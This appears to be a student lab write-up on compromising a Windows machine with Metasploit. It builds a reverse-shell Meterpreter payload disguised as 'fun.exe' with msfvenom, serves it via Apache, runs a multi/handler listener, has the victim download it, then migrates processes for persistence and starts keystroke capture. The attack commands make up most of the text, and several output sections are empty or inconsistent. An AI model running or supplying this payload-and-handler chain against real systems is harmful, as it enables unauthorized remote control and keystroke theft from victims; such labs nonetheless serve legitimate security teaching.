To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


### Find the attackers ip address using ifconfig

## OUTPUT :

### Create a malicious executable file fun.exe using msfvenom command

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT :

![PAYLOAD](img/02.png)

copy the fun.exe into the apache /var/www/html folder
sudo systemctl apache2 start

## Check the status of apache2

## OUTPUT :

![STATUS CHECK](img/03.png)

### Invoke msfconsole:
## OUTPUT:
![MSFCONSOLE](img/04.png)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT :
![HELP](img/05.png)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
## OUTPUT :

![RECENT](img/RECENT.png)

### WINDOWS :

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads

## BROWSE OUTPUT :

## DOWNLOAD OUTPUT :

![DOWNLOAD](img/G2.png)

## COME BACK TO PARROT :

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  â‡’ can see the fun.exe process running with pid 1156

## OUTPUT :
![PS](<img/og 06.png>)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT :

## WINDOWS OUTPUT :

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

## OUTPUT :

![TYPE OUTPUT](img/09.jpg)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
